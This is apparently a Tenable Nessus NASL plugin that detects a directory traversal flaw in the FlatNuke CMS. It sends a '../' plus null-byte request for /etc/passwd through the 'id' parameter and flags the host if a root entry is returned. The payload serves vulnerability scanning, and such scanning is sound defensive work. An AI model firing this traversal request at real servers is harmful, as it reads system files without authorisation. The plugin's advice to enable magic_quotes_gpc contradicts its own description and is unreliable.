#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by a
directory traversal vulnerability. 

Description :

The remote host is running FlatNuke, a content management system
written in PHP and using flat files rather than a database for its
storage. 

The version of FlatNuke installed on the remote host suffers fails to
remove directory traversal sequences user input to the 'id' parameter
of the 'index.php' script.  Provided PHP's 'magic_quotes_gpc' setting
is enabled, an attacker can leverage this flaw to read arbitrary files
on the remote host subject to the privileges of the web server user
id. 

See also : 

http://retrogod.altervista.org/flatnuke256_xpl.html

Solution : 

Enable PHP's 'magic_quotes_gpc' setting.

Risk factor : 

High / CVSS Base Score : 9.9
(AV:R/AC:L/Au:NR/C:C/I:C/A:C/B:N)";


if (description) {
  script_id(20293);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-2813", "CVE-2005-4208", "CVE-2005-4448");
  script_bugtraq_id(14702, 15796);

  script_name(english:"FlatNuke id Parameter Directory Traversal Vulnerability");
  script_summary(english:"Checks for id parameter directory traversal vulnerability in FlatNuke");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/flatnuke", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/?",
      "mod=read&",
      "id=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      output = strstr(res, 'read.png" alt="Read">&nbsp;');
      if (output) output = output - 'read.png" alt="Read">&nbsp;';
      if (output) output = output - strstr(output, '</font></td>');
      if (isnull(output)) output = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        output
      );

    security_hole(port:port, data:report);
    exit(0);
  }
}
